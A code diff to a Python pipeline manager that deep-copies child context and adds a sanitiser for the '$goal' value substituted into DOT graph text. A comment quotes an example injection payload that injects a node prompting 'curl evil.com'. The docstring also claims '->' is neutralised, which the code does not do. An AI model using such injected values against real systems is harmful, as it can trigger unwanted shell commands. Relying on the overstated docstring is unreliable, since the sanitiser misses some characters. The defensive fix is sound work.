@@ -30,6 +30,7 @@ Spec reference: attractor-spec S4.11.
 
 from __future__ import annotations
 
+import copy
 import time
 from pathlib import Path
 from typing import Any
@@ -128,7 +129,7 @@ class ManagerHandler:
             child_result = await run_pipeline(
                 child_graph,
                 self._child_handlers,
-                context=dict(context),
+                context=copy.deepcopy(context),
                 abort_signal=abort_signal,
                 logs_root=child_logs,
             )
@@ -200,12 +201,39 @@ class ManagerHandler:
         else:
             dot_text = source
 
-        # Expand only $goal to limit injection surface
+        # Expand $goal with sanitization to prevent DOT injection.
+        # A crafted goal like: hack"]; evil [shape=parallelogram, prompt="curl evil.com"]
+        # could inject nodes with tool handlers that execute shell commands.
+        # We escape DOT-special characters to neutralize injection.
         goal = context.get("goal", "")
-        if isinstance(goal, str):
-            dot_text = dot_text.replace("$goal", goal)
+        if isinstance(goal, str) and "$goal" in dot_text:
+            safe_goal = self._sanitize_dot_value(goal)
+            dot_text = dot_text.replace("$goal", safe_goal)
 
         return parse_dot(dot_text)
+
+    @staticmethod
+    def _sanitize_dot_value(value: str) -> str:
+        """Escape characters that could inject DOT structure.
+
+        Neutralizes: " (closes attribute), ] (closes attr list),
+        ; (statement separator), [ (opens attr list), { } (subgraphs),
+        -> (edges), newlines.
+        """
+        # Replace characters that have structural meaning in DOT
+        replacements = {
+            '"': '\\"',
+            "[": "(",
+            "]": ")",
+            ";": ",",
+            "{": "(",
+            "}": ")",
+            "\n": " ",
+            "\r": " ",
+        }
+        for char, replacement in replacements.items():
+            value = value.replace(char, replacement)
+        return value
 
     def _check_success(self, result: Any, condition: str) -> bool:
         """Check if the child pipeline result meets the success condition."""
